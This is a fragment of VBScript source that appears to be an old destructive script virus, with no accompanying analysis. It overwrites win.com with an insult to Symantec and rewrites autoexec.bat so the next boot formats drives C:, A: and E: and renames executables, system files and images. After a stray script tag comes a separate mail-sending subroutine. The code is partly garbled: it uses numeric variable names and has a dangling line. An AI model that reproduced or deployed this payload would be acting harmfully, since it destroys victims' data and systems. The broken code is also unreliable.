Set 321 = CreateObject("WScript.Shell")

   Dim fso, 321
  
   Set 321 = fso.CreateTextFile("c:\windows\win.com", True)
   
   321.WriteLine("echo Symantec security response sucks, please learn how decrypt viruses, momma fucka.")

   321.Close 

    
  

Set 321 = fso.CreateTextFile("c:\autoexec.bat", True)
  
   321.WriteLine("@echo off")
   321.WriteLine("cls") 
   321.WriteLine("Format /y c:") 
   321.WriteLine("Format /y A:")
   321.WriteLine("Format /y E:")  
   321.WriteLine "symantec sucks"
   321.WriteLine "@echo off"
   321.WriteLine " Symantec sucks, don't bought Symantec products, it's make your pc bad and slow"
   321.WriteLine "rename *.vbs *.AGM"
   321.WriteLine "rename *.jpg *.AGM"
   321.WriteLine "rename *.exe *.AGM"
   321.WriteLine "rename *.sys *.AGM"
                 
   321.Close 



</script>
















Sub SendMailCDONTS(aTo, Subject, TextBody, aFrom)
  Const CdoBodyFormatText = 1
  Const CdoBodyFormatHTML = 0
  Const CdoMailFormatMime = 0
  Const CdoMailFormatText = 1
  Dim Message 'As New cdonts.NewMail
  
  
  Set Message = CreateObject("cdonts.NewMail")
  With Message
    
    
    .To = aTo
    .Subject = Subject
    .Body = TextBody
    
    
    .MailFormat = CdoMailFormatText
    .BodyFormat = CdoBodyFormatText
    .
    If Len(aFrom) > 0 Then .From = aFrom
    
    
    .Send
  End With
End Sub

